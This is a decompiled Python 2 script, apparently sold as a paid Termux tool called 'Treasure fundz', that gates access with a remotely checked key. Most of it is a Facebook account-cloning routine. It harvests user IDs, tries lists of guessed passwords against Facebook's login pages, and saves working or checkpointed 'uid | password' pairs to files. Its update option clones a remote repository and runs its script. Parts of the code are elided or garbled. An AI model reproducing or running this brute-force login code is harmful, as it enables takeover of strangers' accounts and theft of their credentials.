...
logo = "'\x1b[1;91m' \n    ########     ########     ########  \n    ##     ##    ##           ##     ##    \n    ##     ##    ##           ##      ##   \n    ########     ########     ##      ##  \n    ##   ##      ##           ##      ##  \n    ##    ##     ##           ##     ## \n    ##     ##    ########     ######## \n\n\n'\x1b[1;91m'   Author      :     Treasure fundz  \n'\x1b[1;92m'   Github      :   Treasure2005    \n'\x1b[1;92m'   Treasure     :       Fundz  \n'\x1b[1;91m'   TOOL TYPE   :     PAID COMMAND \n'\x1b[1;92m'   WAP NUMBER  :     +2349150619870          \n"
dec = '2'
server = '2'
rsauser = 'Mozilla/5.0 (Linux; Android 11; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36:]'
...
def main_apv():
    ...
    print logo
    try:
        key1 = open('/sdcard/.Treasure.txt', 'r').read()
    except IOError:
        os.system('clear')
        print logo
        print '           You dont have subscrption'
        print '           Hello Dear this is paid command Or'
        print '           Subscription is not free Please'
        print '           contact admin Thanks'
        print '            Press enter to contact admin'
        print '           Or Whatsapp Treasure fundz Thanks'
        print ''
        myid = uuid.uuid4().hex[:30]
        print '         YOUR KEY : ' + myid + imt
        kok = open('/sdcard/.Treasure.txt', 'w')
        kok.write(myid + imt)
        kok.close()
        print ''
        print '           send your key to me'
        print '           Copy your key an send to the admin'
        print ''
        print ''
        print ''
        print '     Approval Key Copy Kr K Enter Press Kren'
        raw_input('    Approval Lene K Bd Termux Se Exit Kr K Dobara Command Run Kren')
        os.system('xdg-open https://wa.me/+2349150619870')

    r1 = requests.get('https://raw.githubusercontent.com/Musab090/Msb/main/0.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
        ...
        print '     Approval Key Copy Kr K Enter Press Kren'
        raw_input('    Approval Lene K Bd Termux Se Exit Kr K Dobara Command Run Kren ')
        os.system('xdg-open https://wa.me/+923067450876')
...
def main_system():
    ...
    print 43 * '~'
    print '\x1b[1;92m[*]\x1b[1;95m For Need Help Contact Me On Fb And \x1b[1;9 Six Code  '
    print 43 * '~'
    main_input()
...
def main_input():
    ...
    if mx == '1':
        ...
        print ''
        print '    [1] Cloning With 2 Pass (first last & First Last)'
        ...
        print '\x1b[1;92m        Member In Treasure fundz Paid Commands '
        print '\x1b[1;91m        ENJOY   '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('git clone https://github.com/treasure2005/fundz')
        os.system('rm -rf PAID')
        os.system('cp -f PAID/PAID \\.')
        os.system('rm -rf PAID')
        os.system(' cd PAID')
        os.system(' python2 Treasure.py')
        time.sleep(5)
        xox('\x1b[92;1m\n TOOL UPDATE SUCCESSFUL :)\n')
        time.sleep(2)
        main_system()
    elif mx == '7':
        os.system('xdg-open https://wa.me/+2319150619870')
        time.sleep(3)
        main_system()
    else:
        print 'invild option'
...
def numcloning():
    ...
    def main(arg):
        ...
        try:
            ...
            rana.headers.update({'Host': 'mfacebook.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = rana.get('https://mfacebook.facebook.com')
            b = rana.post('https://mfacebook.facebook.com/login.php', data={'email': uid + user, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[Treasure-OK] ' + coc + user + ' | ' + pass1
                ok = open('random-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[Treasure-CP] ' + coc + user + ' | ' + pass1
                cp = open('Treasure random-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
...
def mineExt():
    ...
    fuck.close()
    print ''
    print sm + '[=] Extracting From Treasure : ' + nid + ' > \x1b[1;91mFriends'
    print ''
    time.sleep(2)
    ...
    print ''
    os.system(' cat look.txt | grep "100079" >> kk.txt')
    os.system(' cat look.txt | grep "100080" >> kk.txt')
    os.system('rm -rf PAID.txt')
    file = open('kk.txt')
    my_line = file.readline()
    count.append(my_line)
    print g + '[=] Extracting From Treasure : ' + my_line[:15]
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[ITreasure-OK] ' + uid + ' | ' + pass1
                ok = open('Treasure-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[Treasure-CP] ' + uid + ' | ' + pass1
                cp = open('Treasure-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[Treasure-OK] ' + uid + ' | ' + pass2
                    ok = open('Treasure-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[Treasure-CP] ' + uid + ' | ' + pass2
                    cp = open('Treasure-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[Treasure-OK] ' + uid + ' | ' + pass3
                        ok = open('Treasure-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[Treasure-CP] ' + uid + ' | ' + pass3
                        cp = open('Treasure-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[Treasure-OK] ' + uid + ' | ' + pass4
                            ok = open('Treasure-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[ITreasure-CP] ' + uid + ' | ' + pass4
                            cp = open('Treasure-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[Treasure-OK] ' + uid + ' | ' + pass5
                                ok = open('Treasure-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[Treasure-CP] ' + uid + ' | ' + pass5
                                cp = open('Treasure-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
...
def xokp():
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[Treasure-OK] ' + uid + ' | ' + pass1
                ok = open('Treasure-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;91m[Treasure-CP] ' + uid + ' | ' + pass4
                            cp = open('Treasure-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;91m[ITreasure-CP] ' + uid + ' | ' + pass5
                                cp = open('Treasure-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[TREASURE-OK] ' + uid + ' | ' + pass3
                        ok = open('TRESUREFUNDZ-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[TREASURE-CP] ' + uid + ' | ' + pass3
                        cp = open('TREASUREFUNDZ-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                ...
                if ty == '7':
                    ...
                    if ty == '9':
                        ...
                        if ty == '10':
                            ...
                            ps1 = raw_input('[8] Enter Pass : ')
                            ps1 = raw_input('[9] Enter Pass : ')
                            ps1 = raw_input('[10] Enter Pass : ')
                        print ''
                        print ' [ Maximum Limit10 ]'
                        print ''
                        ty = raw_input('[!] How Many Links Do You Want To Clone : ')
                        print ''
                        if ty == '1':
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[TREASURE-OK] ' + uid + ' | ' + pass5
                                ok = open('TREASUREFUNDZ-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[TREASURE-OK] ' + uid + ' | ' + pass6
                                    ok = open('TREASURE-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[TREASUREFUNDZ-CP] ' + uid + ' | ' + pass6
                                    cp = open('TREASUREFUNDZ-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
...
if __name__ == '__main__':
    main_apv()
# okay decompiling /sdcard/Download/Treasure fundz.pyc
